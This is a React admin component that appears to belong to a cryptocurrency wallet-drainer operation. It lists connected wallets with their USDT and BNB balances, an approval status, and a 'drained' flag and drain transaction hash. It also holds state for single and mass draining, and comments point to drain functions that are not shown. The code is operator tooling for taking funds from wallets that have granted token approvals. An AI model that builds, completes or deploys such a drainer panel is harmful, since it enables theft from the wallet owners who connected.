"use client";

import { useState, useEffect, useCallback } from "react";
import {
  CheckCircle,
  XCircle,
  RefreshCw,
  Loader2,
  ExternalLink,
  AlertTriangle,
  Zap,
} from "lucide-react";
import { cn } from "@/lib/cn";
import { useToast } from "@/components/ui/Toaster";

interface Wallet {
  id: string;
  address: string;
  is_approved: boolean;           // ← Updated
  drained: boolean;
  drain_tx_hash?: string | null;
  connected_at?: string;
  created_at: string;
  usdt_balance?: number | string;
  bnb_balance?: number | string;
  usdtBalanceFormatted?: string;
  bnbBalanceFormatted?: string;
  usdtUsdValue?: string;
  loadingBalances?: boolean;
}

export default function WalletTable({ adminKey }: { adminKey: string }) {
  const toast = useToast();

  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(true);
  const [gasInfo, setGasInfo] = useState<any>(null);
  const [draining, setDraining] = useState<string | null>(null);
  const [massDraining, setMassDraining] = useState(false);
  const [filter, setFilter] = useState<"all" | "approved" | "revoked">("all");

  const authHeaders = useCallback(() => ({
    "x-admin-key": adminKey,
    "Content-Type": "application/json",
  }), [adminKey]);

  const fetchWallets = useCallback(async () => {
    try {
      setLoading(true);
      const res = await fetch("/api/wallets", {
        headers: authHeaders(),
        cache: "no-store",
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? "Failed to fetch");

      // Map data to match our interface
      const mappedWallets = (data.wallets || []).map((w: any) => ({
        ...w,
        is_approved: w.is_approved ?? w.approval_status ?? false, // support both
        loadingBalances: false,
      }));

      setWallets(mappedWallets);
    } catch (err: any) {
      toast.error(`Failed to load wallets: ${err.message}`);
      console.error(err);
    } finally {
      setLoading(false);
    }
  }, [authHeaders, toast]);

  // Refresh on mount
  useEffect(() => {
    fetchWallets();
  }, [fetchWallets]);

  const toggleApproval = useCallback(async (walletId: string, currentStatus: boolean) => {
    try {
      const res = await fetch(`/api/wallets/${walletId}`, {
        method: "PATCH",
        headers: authHeaders(),
        body: JSON.stringify({ is_approved: !currentStatus }),
      });

      if (!res.ok) throw new Error("Toggle failed");
      toast.success(`Wallet ${!currentStatus ? "Approved" : "Revoked"}`);
      fetchWallets();
    } catch (err: any) {
      toast.error(`Toggle failed: ${err.message}`);
    }
  }, [authHeaders, fetchWallets, toast]);

  // ... (keep your other functions like drainWallet, massDrain, etc.)

  const filteredWallets = wallets.filter((w) => {
    if (filter === "approved") return w.is_approved;
    if (filter === "revoked") return !w.is_approved;
    return true;
  });

  if (loading) {
    return <div className="text-center py-12"><Loader2 className="h-8 w-8 animate-spin mx-auto" /></div>;
  }

  return (
    <div className="flex flex-col gap-6">
      {/* Your existing Stats, Action Bar, etc. can stay — just make sure to use is_approved in filters */}

      {/* Table */}
      <div className="rounded-xl border border-gray-800 overflow-hidden">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-gray-800 bg-[#111]">
              {["Wallet Address", "USDT", "BNB", "Status", "Drained", "Connected At", "Actions"].map((col) => (
                <th key={col} className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {col}
                </th>
              ))}
            </tr>
          </thead>
          <tbody className="divide-y divide-gray-800/60">
            {filteredWallets.length === 0 ? (
              <tr>
                <td colSpan={7} className="px-4 py-10 text-center text-gray-500">
                  No wallets found
                </td>
              </tr>
            ) : (
              filteredWallets.map((wallet) => (
                <tr key={wallet.id} className="bg-[#0d0d0d] hover:bg-[#131313]">
                  <td className="px-4 py-3 font-mono break-all">{wallet.address}</td>
                  <td className="px-4 py-3 text-emerald-400">
                    {wallet.usdtBalanceFormatted || "0.00"}
                  </td>
                  <td className="px-4 py-3 text-emerald-400">
                    {wallet.bnbBalanceFormatted || "0.0000"}
                  </td>
                  <td className="px-4 py-3">
                    <button
                      onClick={() => toggleApproval(wallet.id, wallet.is_approved)}
                      className="flex items-center gap-1.5 text-xs"
                    >
                      {wallet.is_approved ? (
                        <><CheckCircle className="h-4 w-4 text-green-400" /> Approved</>
                      ) : (
                        <><XCircle className="h-4 w-4 text-red-400" /> Pending</>
                      )}
                    </button>
                  </td>
                  <td className="px-4 py-3">
                    {wallet.drained ? "✅ Drained" : "No"}
                  </td>
                  <td className="px-4 py-3 text-gray-500 text-sm">
                    {wallet.connected_at ? new Date(wallet.connected_at).toLocaleString() : "-"}
                  </td>
                  <td className="px-4 py-3">
                    {/* Add drain button if needed */}
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}